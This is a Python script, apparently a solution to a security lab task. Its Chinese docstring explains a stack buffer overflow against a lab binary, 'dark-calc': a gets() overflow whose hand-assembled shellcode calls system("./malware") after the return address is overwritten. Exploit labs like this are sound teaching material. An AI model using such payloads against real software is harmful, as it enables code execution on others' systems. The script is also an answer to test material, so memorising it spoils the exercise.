#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

目标是让 dark-calc 通过缓冲区溢出执行 attack/malware（引爆炸弹）。

攻击思路：
  1. input() 用 gets() 读入 expression[16]，没有任何长度检查；
  2. dark-calc 由 __wrap_main 把 rsp 固定到 0x721000801000（init_fixed_stack
     用 mmap(MAP_FIXED) 申请了这块 RWX 区域），所以栈地址是确定的：
     expression = 0x721000800fd0，返回地址在 0x721000800fe8；
  3. 前 24 字节写 shellcode，第 24~31 字节覆盖返回地址，让它跳回 shellcode；
  4. shellcode 调用 system("./malware")，脚本检测到父进程链里有 dark-calc 就报成功。
"""
import struct
import sys

STACK_EXPR = 0x721000800FD0   # input() 的 expression[]（固定栈）
SYSTEM_PLT = 0x4017E0         # eval() 里 call 的 system@plt

STR_ADDR = STACK_EXPR + 32    # "./malware" 放在返回地址之后

code = b""
code += b"\x48\xbf" + struct.pack("<Q", STR_ADDR)      # movabs rdi, STR_ADDR
code += b"\x48\xb8" + struct.pack("<Q", SYSTEM_PLT)    # movabs rax, system@plt
code += b"\xff\xd0"                                    # call rax

assert len(code) <= 24, len(code)

payload = code + b"C" * (24 - len(code))   # 填充到 "缓冲区 + 保存的 rbp" 共 24 字节
payload += struct.pack("<Q", STACK_EXPR)   # 覆盖 input() 的返回地址
payload += b"./malware\x00"                # 被 system() 执行的字符串

sys.stdout.buffer.write(payload + b"\n")
